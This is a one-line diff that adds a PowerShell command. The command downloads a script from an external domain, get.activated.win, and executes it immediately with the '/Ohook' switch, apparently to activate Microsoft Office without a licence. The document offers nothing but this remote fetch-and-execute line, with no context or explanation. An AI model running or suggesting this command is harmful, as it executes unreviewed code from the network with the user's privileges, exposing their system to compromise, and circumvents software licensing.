@@ -1,0 +1,1 @@
+& ([ScriptBlock]::Create((Invoke-RestMethod https://get.activated.win))) /Ohook
